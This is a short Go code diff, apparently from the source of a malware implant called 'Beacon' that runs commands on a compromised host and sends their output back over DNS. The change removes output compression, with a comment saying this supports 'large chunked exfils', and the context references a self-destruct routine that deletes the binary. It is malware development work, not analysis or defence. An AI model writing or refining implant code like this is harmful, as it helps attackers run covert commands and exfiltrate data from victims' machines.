@@ -161,8 +161,8 @@ func (b *Beacon) executeCommand(command string) string {
 
 	result := string(output)
 
-	// Compress large outputs (>1KB) to reduce DNS traffic
-	return compressOutput(result)
+	// Return raw result - compression removed to support large chunked exfils
+	return result
 }
 
 // selfDestruct removes the beacon binary and exits
